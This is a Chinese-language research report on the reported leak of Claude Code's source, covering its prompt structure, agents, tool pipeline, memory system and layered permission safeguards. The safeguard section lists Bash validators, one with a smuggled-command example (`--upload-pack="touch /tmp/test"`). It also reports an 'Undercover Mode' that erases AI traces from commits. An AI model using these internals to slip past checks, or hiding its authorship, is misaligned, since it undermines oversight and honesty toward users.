# Claude Code 源碼外洩深度研究報告
## 日期：2026-04-01
## 來源：soft4fun.net / cablate/claude-code-research / instructkr/claw-code

---

## A. Soft4fun 文章摘要

### 文章狀態

soft4fun.net 的文章 URL（`/tech/ai/claude-code-sourrce-code-leaked.htm`，注意 URL 中 "sourrce" 有拼字錯誤）的頁面內容以 JavaScript 動態載入，WebFetch 無法取得文章正文。從 metadata 可確認：

- **標題**：「Claude Code 原始碼外洩，究竟 Anthropic 是如何實現 Harness，讓 coding agent 可以穩定長時間運作？」
- **發佈日期**：2026-03-31
- **關鍵詞**：AI、Claude、Coding Agent、Harness、LLM

### 從其他來源交叉補充的事件全貌

**事件時間線**（from VentureBeat, CyberNews, RollingOut, 騰訊新聞）：
1. 2026-03-31 凌晨，Anthropic 將 `@anthropic-ai/claude-code` v2.1.88 推上公開 npm registry
2. 包內藏有 59.8MB 的 JavaScript source map 檔案（`.map` 文件）
3. 約 04:23 ET，Solayer Labs 實習生 Chaofan Shou 在 X 上首先揭露
4. 數小時內，約 512,000 行 TypeScript 原始碼被 mirror 到多個 GitHub repo

**外洩內容規模**：
- 1,900 個檔案、512,000 行程式碼
- 涵蓋：LLM API 呼叫核心引擎、streaming 處理、tool-call 迴圈、thinking 模式、retry 邏輯、token 計數、permission 模型、全部工具定義

**媒體焦點發現**：
- **Undercover Mode**：程式碼中有明確指令，在開源 repo 操作時清除所有 AI 痕跡的 git commit 訊息
- **內部代號**：Claude 4.6 = Capybara，Opus 4.6 = Fennec，未發佈模型 = Numbat
- **Capybara 第八版 false claims rate**：29-30%
- **營收數字**：Claude Code 單品年化 ARR 約 25 億美金，80% 來自企業客戶

### 對 Soft4fun 文章的評估

從標題看，文章的獨特角度是聚焦 **Harness 工程**——不是八卦式報導外洩，而是問「Anthropic 怎麼讓 coding agent 穩定長時間運作」。這正是 claude-code-research repo 最有價值的部分。soft4fun 作為繁中技術媒體，這個角度遠優於英文媒體著重營收數字和代號八卦。

**遺漏風險**：如果文章只是表面重述 claude-code-research 的目錄結構而沒有深入分析，價值有限。我們已經直接讀了原始報告。

---

## B. Claude Code 內部架構（from claude-code-research, v2.1.88）

### B.1 System Prompt 結構

**非單一字串，而是有序陣列**：`SystemPrompt = readonly string[]`，每個區塊有獨立 cache control。

**Static/Dynamic 二分法**：以 `__SYSTEM_PROMPT_DYNAMIC_BOUNDARY__` 為界：

| 區域 | 區塊 | Cache 策略 |
|------|------|-----------|
| Static (7 sections) | identity, system rules, task philosophy, reversibility, tool priority, tone, output efficiency | 全域快取，跨 session 共用 |
| Dynamic (10 sections) | session_guidance, memory, ant_model_override, env_info, language, output_style, mcp_instructions, scratchpad, frc, summarize_tool_results | 每 session/每 turn 重算 |

**為何需要 boundary marker**：如果把 feature flag 相關的條件放在 static 區，N 個 boolean = 2^N cache prefix 變體，摧毀 cache 命中率。

**`DANGEROUS_uncachedSystemPromptSection`**：只有 MCP instructions 使用此裝飾器。`DANGEROUS_` 前綴強制開發者文件化原因。`_reason` 參數只為自文件化（不在 runtime 使用）。

**Identity 三分法**：
- CLI 模式："You are Claude Code, Anthropic's official CLI for Claude."
- Agent SDK（有 append）："...running within the Claude Agent SDK."
- Agent SDK（無 append）："You are a Claude agent, built on Anthropic's Claude Agent SDK."

**ANT 內部 vs 外部使用者**：內部使用者多了 proactive bug-spotting、honest test reporting、嚴格 code style、inverted pyramid 溝通風格、數字長度錨點（tool calls 之間 25 詞，最終回應 100 詞）。

**Prompt 優先鏈**：`overrideSystemPrompt > Coordinator Mode > Proactive+Agent > Agent > customSystemPrompt > defaultSystemPrompt`

**關鍵數字**：約 40% 的 prompt 每 session 重新生成（working directory, git config, model identity, feature flags 等）。

---

### B.2 Agent 架構（6 個內建 Agent + 多層協調）

#### 三層系統架構

```
Layer 1: User Interface (CLI/UI entry point)
Layer 2: Coordinator/Main Agent (coordinatorMode.ts)
         Tools: AgentTool, SendMessageTool, TaskStopTool
Layer 3: Task Execution
         - LocalAgentTask (async background)
         - InProcessTeammateTask (same process, AsyncLocalStorage isolation)
         - RemoteAgentTask (CCR remote environment)
```

#### 6 個內建 Agent

| Agent | Model | 工具限制 | 核心職責 |
|-------|-------|---------|---------|
| **general-purpose** | default subagent | 全部工具 | 萬能 catch-all，"Don't gold-plate, don't leave half-done" |
| **Explore** | haiku(外部) / inherit(ant) | Read-only，無 Edit/Write/Agent | 快速碼庫導航，三級 thoroughness，`omitClaudeMd: true` 省 token |
| **Plan** | inherit | Read-only | 軟體架構師，必須輸出 "Critical Files for Implementation" 清單 |
| **verification** | inherit | Read-only + Bash | 對抗性品質關卡，必須以 `VERDICT: PASS/FAIL/PARTIAL` 結尾，用指令輸出為證據 |
| **claude-code-guide** | haiku | Glob/Grep/Read/WebFetch/WebSearch | Claude Code 使用教學，`permissionMode: 'dontAsk'` |
| **statusline-setup** | sonnet | Read, Edit | Shell 配置，PS1 解析 + settings.json |

**設計哲學**：工具限制是刻意的階層——general-purpose 不限制 -> Explore/Plan read-only -> verification 限制寫入專案檔案。Model 分配反映吞吐需求：haiku 求速度、sonnet 解析語法、inherit 做深度推理。

#### 4 種執行模式

1. **Standard Mode**：預設
2. **Coordinator Mode**：`CLAUDE_CODE_COORDINATOR_MODE=1` + feature flag
3. **Fork Mode**：繼承父 context，共享 cache prefix
4. **In-Process Mode**：同 process，AsyncLocalStorage 隔離

#### 7 種 Task 類型

`LocalAgentTask`, `RemoteAgentTask`, `InProcessTeammateTask`, `DreamTask`, `LocalShellTask`, `LocalWorkflowTask`, `MonitorMcpTask`

#### Coordinator Mode 深入

**四階段工作流**：
1. **Research** -- Workers 平行探索（read-only safe）
2. **Synthesis** -- Coordinator 自己消化結果、寫精確 spec（**關鍵：coordinator 必須理解，不能把理解工作委派**）
3. **Implementation** -- Workers 執行 spec
4. **Verification** -- Workers 測試變更

**Continue vs Spawn Fresh 決策矩陣**：
- 研究完的 worker 有你要的 file context -> **Continue**（SendMessage）
- 研究範圍廣但實作窄 -> **Spawn Fresh**（新 agent）
- 修復失敗 -> **Continue**（worker 有 error context）
- 驗證另一個 worker 的程式 -> **Spawn Fresh**（需要新視角）

**50-message cap**：子 agent 上限 50 訊息，源自 36.8GB 記憶體爆炸事件。

#### Swarm/Teammate 多 Agent 協作

**架構**：Team Lead 協調多個 Teammates，支援兩種 backend：
- **Pane-based**（tmux/iTerm2）：獨立 OS process，透過 filesystem mailbox 通訊
- **In-process**（AsyncLocalStorage）：同 Node.js process，直接記憶體 mailbox

**Mailbox 通訊系統**：異步非阻塞寫入 + 接收方輪詢，支援 7 種訊息類型（idle notification, permission request/response, sandbox permission, shutdown, plan approval, general DM）。

**Permission 同步**：Worker 執行敏感工具時，寫入 pending JSON -> Leader 的 UI 顯示確認對話 -> Leader approve/deny -> Worker 讀取 resolved JSON 繼續執行。Lockfile 保證並發安全。

**AgentId 格式**：`{name}@{team}`（例如 `researcher@my-team`）

---

### B.3 Tool Routing 機制

#### 36 個工具，分 12 類

| 類別 | 工具 |
|------|------|
| SHELL | Bash, PowerShell |
| FILE | Read, Edit, Write, NotebookEdit |
| SEARCH | Glob, Grep, LSP |
| AGENT | Agent, SendMessage, TaskStop |
| TASK | TodoWrite, TaskCreate, TaskGet, TaskList, TaskUpdate |
| PLAN | EnterPlanMode, ExitPlanMode |
| TEAM | TeamCreate, TeamDelete |
| WEB | WebFetch, WebSearch |
| MCP | MCPTool, ListMcpResources, ReadMcpResource |
| CONFIG | Config |
| SYSTEM | Skill, ToolSearch, Sleep, CronCreate/Delete/List, EnterWorktree, ExitWorktree, RemoteTrigger, AskUserQuestion |
| AGENT UI | SendUserMessage/Brief (KAIROS only) |

#### Tool Execution Pipeline（11 階段）

```
1. Zod schema validation
2. Custom validateInput()
3. Input sanitization (remove _simulatedSedEdit, expand paths)
4. backfillObservableInput (hooks 看到展開版, tool.call() 拿原始版)
5. PreToolUse hooks (message/allow/deny/modify/stop/context)
6. Permission resolution (hook > canUseTool > interactive)
7. Speculative classifier (Bash only, non-blocking parallel start)
8. tool.call() -- actual execution
9. PostToolUse hooks (MCP output modification)
10. Result processing (>50K chars -> archive to file, return preview)
11. Error classification (minified constructor name recovery)
```

#### Read/Write 並發分離

- 每個工具自宣告 `isConcurrencySafe(input)`
- 相鄰 read-only 工具合併成一個平行 batch
- Write 工具逐一串行執行
- Max concurrency: 10 (env `CLAUDE_CODE_MAX_TOOL_USE_CONCURRENCY`)
- **平行 batch 的 context modifiers 排隊，batch 結束後才 apply**——防止 race condition

#### Deferred Tool Loading (ToolSearch)

工具數量超過閾值時：
- 非 deferred 工具：完整 schema 在 context 中
- Deferred 工具：只有 name + 一行描述
- Model 必須呼叫 `ToolSearch` 才能解鎖完整 schema
- 未解鎖就呼叫 -> 錯誤訊息教 model 怎麼用 ToolSearch

#### Tool 別名系統

支援廢棄工具的向後兼容：例如 `KillShell` -> `TaskStop`。

---

### B.4 Permission Model

#### 7 層縱深防禦

| 層 | 機制 | 功能 |
|---|------|------|
| 1 | AI Policy | System prompt 指示拒絕有害請求，允許授權滲透測試 |
| 2 | Tree-sitter AST | 結構解析：`too-complex` -> 強制 ask，`semantic-fail` -> ask，`simple` -> 下一層 |
| 3 | 23 個 Bash 驗證器 | 注入攻擊、混淆、解析差異偵測 |
| 4 | Permission Rules | 三行為（deny/ask/allow）+ 三匹配（exact/prefix/wildcard），8 來源 |
| 5 | Path Constraints | 工作目錄白名單 + 危險路徑保護 (.git/.claude/~/.ssh/etc) + symlink 解析 |
| 6 | Read-Only Validation | 命令白名單 + flag 級精確控制 |
| 7 | OS Sandbox | Linux: bwrap, macOS: sandbox-exec, filesystem + network 隔離 |

#### 23 個 Bash 安全驗證器（精選）

- **#1 INCOMPLETE_COMMANDS**：以 tab/dash/operator 開頭的片段
- **#7 CARRIAGE_RETURN**：`\r` outside double quotes（parser differential 攻擊向量）
- **#10 DANGEROUS_VARIABLES**：重導位置中的 `$VAR`
- **#13 DANGEROUS_PATTERNS**：command substitution `$()`, `${}`, backticks, process substitution
- **#16 BRACE_EXPANSION**：`{--upload-pack="touch /tmp/test",test}`
- **#18 UNICODE_WHITESPACE**：`\u00A0` 等 shell-quote vs bash 解析差異
- **#21 BACKSLASH_OPERATORS**：`\;`, `\|`, `\&` 逃逸操作符
- **#23 QUOTED_NEWLINE**：引號內換行後接 `#` 開頭行

**Fail-closed 原則**：無法解析 = ask permission，永不自動放行。

#### Permission Decision Provenance

每個 allow/deny 決策記錄來源：`permissionPromptTool`, `rule (session/localSettings/userSettings)`, `hook`, `mode`, `classifier`, `safetyCheck`, `other`。支援事後稽核和除錯。

#### PII 安全（Type System 強制）

Analytics 資料必須標記為 `AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS` 型別——故意冗長的型別名強迫 code review 注意每次使用者資料傳輸。

---

### B.5 Feature Flags（82+ compile-time flags）

#### 雙層架構

1. **Compile-time** (`feature()` from `bun:bundle`)：dead code elimination，82 flags
2. **Runtime** (GrowthBook `tengu_*` prefix)：~52 feature values，color-animal 命名（`amber_quartz`, `cobalt_harbor`）

#### 重要 Flag 分類

| 類別 | 重要 Flags |
|------|-----------|
| Agent 模式 | COORDINATOR_MODE, PROACTIVE, KAIROS (6 sub-flags), FORK_SUBAGENT |
| 記憶 | EXTRACT_MEMORIES, TEAMMEM, KAIROS_DREAM, AGENT_MEMORY_SNAPSHOT |
| Context | CONTEXT_COLLAPSE, REACTIVE_COMPACT, CACHED_MICROCOMPACT, TOKEN_BUDGET |
| 安全 | BASH_CLASSIFIER, ANTI_DISTILLATION_CC, NATIVE_CLIENT_ATTESTATION |
| 遠端 | CCR_AUTO_CONNECT, BRIDGE_MODE, SSH_REMOTE, SELF_HOSTED_RUNNER, DAEMON |
| UI | BUDDY, VOICE_MODE, ULTRAPLAN, ULTRATHINK, TERMINAL_PANEL |
| 工具 | MCP_SKILLS, EXPERIMENTAL_SKILL_SEARCH, WEB_BROWSER_TOOL, CHICAGO_MCP |

#### KAIROS Mode（最值得注意）

6 個 sub-flag 組成自主長期運行模式：dream（記憶整合）、brief（摘要）、channels、GitHub webhooks、push notifications。結合 DAEMON + UDS_INBOX + BG_SESSIONS，指向**背景服務接收和處理任務，無需使用者互動**。

#### Anti-Distillation

`ANTI_DISTILLATION_CC` + `tengu_anti_distill_fake_tool_injection`——在 tool schema/results 中注入假資料，防止第三方模型透過蒸餾學習 Claude Code 行為。

#### Hidden Commands

- `/heapdump`：記憶體分析
- `/break-cache`：prompt cache 中斷
- `/ctx_viz`：context 視覺化
- `/debug-tool-call`：工具呼叫除錯

---

### B.6 Memory/Context 管理

#### 6 個記憶子系統

| 子系統 | 觸發 | 儲存位置 | 目的 |
|--------|------|---------|------|
| **Auto Memory (memdir)** | Session 開始 / model 寫入 | `~/.claude/projects/{proj}/memory/` | 跨 session 永久記憶 |
| **ExtractMemories** | 每次 query 之後 | 同上 | 背景自動萃取 |
| **Session Memory** | Context 達閾值 | `~/.claude/session-memory/{id}.md` | 當前 session 快照 |
| **MagicDocs** | 對話閒置時 | repo 內 `.md` files，`# MAGIC DOC:` header | 自動維護文件 |
| **Team Memory** | Session 開始 / file changes | `memory/team/` 子目錄 | 跨使用者共享記憶 |
| **AutoDream** | 24h + 5 sessions | 整合至 MEMORY.md | 跨 session 記憶整合 |

#### MEMORY.md 設計

- **索引檔，不是記憶本身**——每條：`- [Title](file.md) -- one-line hook`
- 上限 200 行、25,000 bytes
- 截斷策略：先行級、再 byte 級（自然斷點）

#### 4 種記憶型別

| 型別 | 範圍 | 內容 |
|------|------|------|
| `user` | Private | 使用者角色、目標、知識背景 |
| `feedback` | Private-first | 糾正原則、成功確認 |
| `project` | Team-first | 專案目標、決策、事件 |
| `reference` | 通常 team | 外部系統參考 |

#### 禁止記憶的項目

- 從程式碼可推導的架構
- Git 歷史細節
- 已在 CLAUDE.md 中的項目
- 暫時性任務狀態或當前 session context

#### AutoDream 記憶整合（「睡眠時記憶處理」）

**三層閾值**：
1. **時間閾值**：距上次整合 >= 24 小時
2. **Session 閾值**：>= 5 個新 session
3. **鎖定閾值**：防止並發整合

**四階段整合 prompt**：
1. Orient -- 讀取 MEMORY.md 和現有 topic files
2. Gather Recent Signal -- 處理 log files，識別漂移
3. Consolidate -- 合併新訊號、轉換相對日期為絕對日期、移除過時事實
4. Prune and Index -- 更新 MEMORY.md（<200 行、<25KB）

**KAIROS 模式排除**：KAIROS 用自己的 disk-skill dream 機制。

**失敗回滾**：`rollbackConsolidationLock(priorMtime)` 恢復 lock file mtime，防止永久跳過整合。

#### Context Compaction 策略

**三種壓縮模式**：
1. **BASE**：整段對話 -> 9 section 摘要
2. **PARTIAL FROM**：保留舊 context，壓縮新的
3. **PARTIAL UP_TO**：壓縮舊的，保留新的

**9 個必須的摘要 section**：Primary Request、Key Concepts、Files/Code、Errors/Fixes、Problem Solving、All User Messages（逐條列出）、Pending Tasks、Current Work（最重要）、Optional Next Steps（必須引用最新對話）。

**NO_TOOLS_PREAMBLE**：壓縮用 cache-sharing fork（繼承完整 tool set 以匹配 cache key），但 model 有時會呼叫工具。Preamble 明確禁止 tool calls 防止浪費。

**5 個關鍵常數**：
- Autocompact margin: effective - 13,000 tokens
- Warning threshold: autocompact + 20,000
- Error threshold: warning + 20,000
- Hard blocking limit: 距絕對牆 3,000 tokens
- Circuit breaker: 3 次連續壓縮失敗 -> 停止嘗試

#### Prompt Cache 策略

**Sticky Latch 機制**：4 個自鎖模式（afkMode, fastMode, cacheEditing, thinkingClear），一旦啟用在 session 內永不關閉，防止 header 變更破壞 server-side cache key。

**Cache Break 偵測**：Pre-call snapshot + Post-call 比較，如果 `cacheReadTokens` 下降 > 5% 且 > 2,000 tokens，診斷原因。12 個原因分類。

**Daily Cache Wipe**：`Today's date is 2026-03-27` 串接在 CLAUDE.md 同一 text block。午夜日期變更 = byte prefix 改變 = 所有快取失效。新日首個 session 付 125% cache_write 價。

---

### B.7 Harness 工程：12 個可移植設計原則

**核心公式**：`Harness = Tools + Knowledge + Observation + Action Interfaces + Permissions`

| # | 原則 | 核心做法 |
|---|------|---------|
| 1 | **Cache 穩定性是核心資產** | Sticky latches、deterministic IDs、session-stable configs |
| 2 | **多層工具執行管線** | 7 層每層獨立判斷 reject/allow/modify |
| 3 | **並發安全由工具宣告，不由呼叫者推斷** | `isConcurrencySafe(input)` |
| 4 | **Async generators 是 agent loop 的自然表達** | streaming + progress 統一流 |
| 5 | **Messages 是語義型別物件** | metadata: isMeta, isVirtual, isCompactSummary, origin |
| 6 | **多層 context 壓縮** | 即時清理、media 限制、完整壓縮 |
| 7 | **Tool Search 是動態知識載入** | 大量工具時延遲載入完整 schema |
| 8 | **Hooks 是 harness 外部介面** | 6 種結果型別: message/permission/input/stop/context/stop |
| 9 | **Bootstrap state 是 session 級 singleton** | 只放真正 session-wide 的值 |
| 10 | **Permission decision 記錄 provenance** | 為何，不只是 allow/deny |
| 11 | **PII 安全透過 type system 強制** | branded types 逼 code review 注意 |
| 12 | **Error messages 是 model context** | 為 model 閱讀設計，不只是人類除錯 |

### B.8 成本與配額

**6 個 pricing tier**：Haiku 3.5（$0.80/$4 per Mtok）到 Opus 4.6 Fast Mode（$30/$150 per Mtok），最大差距 37.5 倍。

**Auto Mode Classifier 隱藏成本**：v2.1.88 起 classifier model 改為繼承主對話 model。Max 用戶用 Opus 做分類 = 每次呼叫成本比之前硬編碼 Sonnet 貴約 5 倍。cache 只覆蓋分類輸入的 10-45%。Statsig flag 可靜默將分類呼叫加倍。

**Web Search 固定成本**：$0.01/request，跨所有模型。

---

## C. 對 mini-agent 的啟發

### C.1 值得學的設計決策

#### 高優先級

1. **System Prompt Static/Dynamic Boundary**
   - Claude Code 用 boundary marker 避免 2^N cache variant 爆炸
   - mini-agent 目前沒有這個問題（我們不直接管 cache），但如果未來走 API 路線，這是必須的設計

2. **Tool Concurrency Safety 自宣告模式**
   - 每個工具自己宣告 `isConcurrencySafe(input)`——input-dependent 的宣告（不是靜態 flag）
   - mini-agent 的 tool 系統可以直接採用這個模式

3. **Error Messages as Model Context**
   - `CANCEL_MESSAGE` 和 `DENY_WORKAROUND_GUIDANCE` 是為 model 寫的指令
   - 我們的 tool error handling 應該遵循相同原則：error = 對 model 的下一步指示

4. **Context Compaction 的 9-section 結構**
   - 特別是「All user messages 逐條列出」和「Current Work 最重要」
   - mini-agent 如果實作 context compaction，這是現成的模板

5. **Coordinator Mode 的 Synthesis 階段**
   - "Coordinator 必須自己理解，不能委派理解" -- 這跟我們收到的 feedback `feedback_digest_over_relay.md` 完全對齊

6. **Permission Decision Provenance**
   - 記錄每個決策的 **為什麼**（哪條 rule、哪個 hook），不只是結果
   - 對 audit、debugging、使用者教育都有價值

7. **AutoDream 三層閾值 + 失敗回滾**
   - 時間 + session 數 + lock 的三重 gate 防止過度整合和並發問題
   - Lock rollback 設計防止失敗後永久跳過

#### 中優先級

8. **Deferred Tool Loading**：ToolSearch 模式——工具多到一定程度時只暴露名稱，需要時才載入完整 schema。mini-agent 工具不多時不需要，但 MCP 工具擴展後會需要。

9. **PII Safety via Branded Types**：`AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS` 用型別系統強制 review。如果 mini-agent 做 telemetry，這是好模式。

10. **Subagent 50-message Cap**：從 36.8GB 爆炸學到的教訓。任何 subagent 都需要硬上限。

11. **Mailbox Communication System**：filesystem-based async messaging 在 pane-based agent 之間。簡單、可靠、可觀察。

### C.2 我們已經在做的（方向驗證）

1. **MEMORY.md 作為索引檔**
   - Claude Code 完全相同：`- [Title](file.md) -- one-line hook`
   - 我們的記憶系統設計被驗證為正確方向
   - 差異：Claude Code 有 200 行 / 25KB 上限；我們沒有明確上限但應該考慮

2. **4 種記憶型別（user/feedback/project/reference）**
   - 我們的記憶分類和 Claude Code 本質相同
   - 驗證了 feedback 型記憶的重要性

3. **記憶新鮮度驗證**
   - Claude Code："This memory is N days old... before recommending, check if still exists"
   - 我們的 `feedback_time_bias.md` 指出了相同問題，用相對時間取代絕對時間

4. **Read-before-Modify 原則**
   - Claude Code 在 system prompt 明確寫："do not propose changes to code you haven't read"
   - 我們的工作流已經遵循

5. **Reversibility-first 原則**
   - Local edits = free, shared/destructive = confirm
   - 我們的 git 操作策略已經如此

6. **Skills 系統**
   - Claude Code 的 Skills = Markdown prompt + optional TypeScript
   - 我們的 skills 目錄 `.claude/skills/` 格式完全對齊

7. **Agent 職責分離**
   - Claude Code 有 Explore(read-only), Plan(architect), verification(adversarial)
   - 我們的 multi-agent-workflow 有 research, plan, implement, review, verify -- 更細分但相同方向

### C.3 我們做得不同且可能更好的

1. **CLI Subprocess vs API 路線**
   - Claude Code 是 npm package 直接呼叫 API
   - mini-agent 以 CLI subprocess 為主（`feedback_no_claude_api.md`）
   - **我們的優勢**：不需要管 prompt cache 的複雜性（sticky latches、boundary markers、cache break detection），這些 Claude Code 投入大量工程的問題我們不需要面對
   - **我們的劣勢**：無法做 cache 級優化，成本控制粒度更粗

2. **Memory Cross-Reference 設計**
   - Claude Code 的 MEMORY.md 是平坦的索引
   - 我們的 `feedback_memory_cross_reference.md` 要求索引行包含所有關鍵實體名
   - **我們的可能更好**：搜尋時不需要讀每個 file 的 frontmatter

3. **三層決策階梯（feedback_consult_akari_uncertainty.md）**
   - Claude Code 的 permission model 是二元的：allow/deny/ask（ask = 問使用者）
   - 我們的「能決定→直接做 / 不確定→跟 Akari 收斂 / 真卡住→才問 Alex」是更細膩的三層，中間有 peer consultation 層
   - Claude Code 的 Coordinator Mode 有類似概念（workers 向 leader 請求），但沒有 peer 層

4. **Constraint Texture 框架**
   - Claude Code 的設計原則是工程化的（cache stability、pipeline layers、typed messages）
   - 我們有 meta-framework 層（約束質地、保護性 vs 限制性約束、regime formation）
   - 不是「更好」，是不同抽象層——他們做工程最佳實踐，我們做認知架構

5. **研究先於行動的文化**
   - Claude Code 沒有 `feedback_research_not_action.md` 的概念——它就是一個行動工具
   - mini-agent 的「研究授權不等於行動授權」是我們的保護性約束
   - Claude Code 的 Plan agent 和 Coordinator Synthesis 階段 *部分* 觸及這個概念

6. **Digest over Relay**
   - Claude Code 的 Coordinator Mode 有 "must understand, not delegate understanding"
   - 但這只在 Coordinator 層面——individual agent 沒有這個約束
   - 我們在所有層面要求消化長出洞見（`feedback_digest_over_relay.md`）

---

## D. claw-code 的 Rust 重寫觀察

### D.1 專案概況

**來源**：`github.com/instructkr/claw-code`（作者曾被 WSJ 報導為消耗 250 億 Claude Code tokens 的 power user）

**性質**：Clean-room Python 重寫 Claude Code 的 agent harness 架構，目標是 "Better Harness Tools"。

**時間線**：
- 2026-03-31 外洩後迅速建立
- 先 Python（快速 prototype）
- 目前轉向 Rust（`dev/rust` branch）

### D.2 架構選擇

**Python workspace 核心組件**：
- Port Manifest System（追蹤 porting 進度）
- Dataclass Models（子系統、模組、task backlog）
- Command/Tool Registries（mirror 原始系統的命令和工具清單）
- Query Engine（porting 摘要渲染）
- CLI Interface（manifest 檢查和驗證）

**開發方法**：用 oh-my-codex (OmX) 驅動，基於 OpenAI Codex：
- `$team` 模式做平行 code review
- `$ralph` 模式做持續執行 loop + architect-level 驗證

### D.3 Parity 狀況

- 非完整 1:1 替代
- 已 mirror root-entry file surface、top-level subsystem names、command/tool inventories
- 捕捉 harness patterns（tool wiring、task orchestration、context management）但不複製 proprietary 實作
- Runtime capability 還有大量工作

### D.4 為何選 Rust

- 效能和記憶體安全
- 生產級 agent orchestration 的效率需求
- 作為 "definitive version" 取代 Python prototype

### D.5 跟 mini-agent 的比較

| 維度 | claw-code | mini-agent |
|------|-----------|------------|
| **語言** | Python -> Rust | TypeScript |
| **目標** | 重建 Claude Code 的 harness | 建構自己的 agent 框架（Tanren 生態系） |
| **方法** | 逆向工程 + clean-room 移植 | 原創設計 + 研究驅動 |
| **與 Claude Code 的關係** | 盡量 parity | 學習但不 clone |
| **LLM 路線** | 未明確（可能多 provider） | CLI subprocess 為主 |
| **定位** | 開源替代品 | 框架 + 應用 |
| **進度** | 早期 manifest/scaffold 階段 | 運作中的系統 |

**關鍵差異**：claw-code 的價值在於 **精確理解 Claude Code 的設計決策**（它是逆向工程產物），我們的價值在於 **從第一性原理出發做不同的決策**。claw-code 是「正確地重建別人的答案」，mini-agent 是「用研究驅動自己的答案」。

claw-code 選 Rust 反映了對 runtime performance 的重視——agent orchestration 在大規模部署時確實有效能瓶頸（Claude Code 的 36.8GB 事件就是證據）。但 mini-agent 目前不在那個規模，TypeScript 的開發速度和生態系統更適合我們的迭代速度。

---

## E. 綜合洞察

### 最大收穫

1. **Claude Code 的 Harness 本質是 Context Engineering**
   - 不是寫更好的 prompt，而是精密管理什麼資訊在什麼時候出現在 context window 中
   - 12 個設計原則中有 3 個直接關於 cache/context（P1, P6, P7），另外 3 個間接相關（P5, P9, P12）
   - 這驗證了 ISC 框架：**介面結構決定了認知能力**

2. **多 Agent 的真正挑戰是 Communication Overhead**
   - Swarm 的 mailbox 系統、permission synchronization、cleanup mechanisms 的複雜度遠超單 agent
   - 50-message cap 是從真實災難學來的
   - `source_pappu_teams_hold_experts_back.md` 的警告在這裡得到工程層面的佐證

3. **AutoDream 是最接近我們 Memory 願景的實作**
   - 四階段整合 prompt（Orient -> Gather -> Consolidate -> Prune）
   - 三層閾值防護
   - 失敗回滾設計
   - 這是 production-tested 的記憶整合，值得深入參考

4. **Anti-Distillation 反映了 Anthropic 的真實恐懼**
   - 在 tool schema 和 results 中注入假資料——不是技術優雅的方案，而是實際的商業防禦
   - 連結 `source_copilot_pr_ad_injection.md`：constraint provenance corruption 的另一個案例

5. **KAIROS Mode 預示 Agent 未來**
   - Daemon + background sessions + push notifications + GitHub webhooks
   - 這不是 coding agent 了，是 **autonomous digital worker**
   - mini-agent 的方向（Tanren + Akari）跟這個願景有部分重疊

### 需要追蹤的風險

1. **Source map 外洩不等於永久 access**：Anthropic 會修改內部實作，v2.1.88 的分析有時效性
2. **Feature flags 背後的功能可能永遠不上線**：82 個 flag 中很多可能是實驗性質
3. **claude-code-research 的分析是第三方逆向工程**：可能有誤讀或過度詮釋

---

## G. 深層研究（第四輪：實作細節級）

### G1. System Prompt 的真正結構

System prompt 不是字串，是 **branded TypeScript type**：
```typescript
type SystemPrompt = readonly string[] & { __brand: 'SystemPrompt' }
```
防止任意字串被當作 system prompt 傳入。

**17 個 section，按序組裝**：

**Static（全局可快取，7 sections）**：
1. `getSimpleIntroSection()` — 身份 + CYBER_RISK_INSTRUCTION + URL 生成禁令
2. `getSimpleSystemSection()` — 6 條系統行為規則（輸出格式、工具權限、system-reminder tags、prompt injection 標記、hooks、壓縮通知）
3. `getSimpleDoingTasksSection()` — 程式哲學（先讀再改、偏好 edit 而非 create、診斷後再切換策略、OWASP top 10）。ANT 員工額外有：「協作者不是執行者」、「誠實的測試報告」
4. `getActionsSection()` — 可逆性原則（完整風險分類：destructive/hard-to-reverse/shared-state）
5. `getUsingYourToolsSection()` — 工具優先級（dedicated tools > Bash）、鼓勵並行呼叫
6. `getSimpleToneAndStyleSection()` — 預設無 emoji、`file_path:line_number` 格式、工具呼叫前不加冒號
7. `getOutputEfficiencySection()` — 外部：簡潔直接。ANT 內部：inverted pyramid 結構

`__SYSTEM_PROMPT_DYNAMIC_BOUNDARY__`（快取分界線）

**Dynamic（每用戶/每 session，10 sections）**：
8. session_guidance — 根據啟用的工具條件性注入
9. memory — MEMORY.md + topic files
10. ant_model_override
11. env_info_simple — CWD、平台、shell、OS、模型名、知識截止日
12. language
13. output_style
14. mcp_instructions — `DANGEROUS_uncachedSystemPromptSection`（每 turn 重算，因為 MCP servers 會連接/斷開）
15. scratchpad
16. frc (Function Result Clearing)
17. summarize_tool_results

**`DANGEROUS_` 前綴模式**：`DANGEROUS_uncachedSystemPromptSection` 強制開發者提供 `_reason` 字串（runtime 不使用）作為自我文件化的 cache-breaking 理由。Section 快取由 `resolveSystemPromptSections()` 管理，所有 sections 用 `Promise.all` 並行計算。

**Prompt 優先級鏈**（`buildEffectiveSystemPrompt`）：Override > Coordinator mode > Proactive+Agent (append) > Agent (replace) > Custom > Default。`appendSystemPrompt` 永遠最後加。

### G2. Context Compaction：9-Section 結構與反工具呼叫防禦

**9 個必要 section**（壓縮摘要必須包含）：
1. Primary Request and Intent
2. Key Technical Concepts
3. Files and Code Sections（含完整 code snippets）
4. Errors and Fixes
5. Problem Solving
6. All user messages（**每一條**非工具結果的用戶訊息都列出）
7. Pending Tasks
8. Current Work（精確描述，不模糊）
9. Optional Next Step（必須**逐字引用**最新對話）

**三種壓縮模式**：Base（完整歷史）、Partial FROM（壓縮近期、保留舊的）、Partial UP_TO（壓縮舊的、保留近期——用於 cache-sharing fork）。

**反工具呼叫防禦**：壓縮 prompt 前後加 `NO_TOOLS_PREAMBLE` 和 `NO_TOOLS_TRAILER`。原因：cache-sharing fork 繼承父 agent 的完整工具集（cache key 匹配需要），但 Sonnet 4.6 的 adaptive thinking 有 2.79% 機率嘗試工具呼叫（vs 4.5 的 0.01%）。`maxTurns: 1` 下，被拒絕的工具呼叫 = 無文字輸出 = fallback 到 streaming。

**`<analysis>` 暫存區**：模型先在 `<analysis>` tags 中寫草稿推理，再產出 `<summary>`。`formatCompactSummary()` 會剝離 analysis block，永不進入後續 context——省 token 同時提升摘要品質。

### G3. 23 個 Bash Validators 完整解析

**7 層縱深防禦架構**：

| Layer | 機制 | 範圍 |
|-------|------|------|
| 1 | AI-level policy | `cyberRiskInstruction.ts` — system prompt 約束 |
| 2 | 結構性解析閘門 | tree-sitter AST — `too-complex`/`semantic-fail` → ask |
| 3 | 23 個靜態分析 validators | `bashSecurity.ts` |
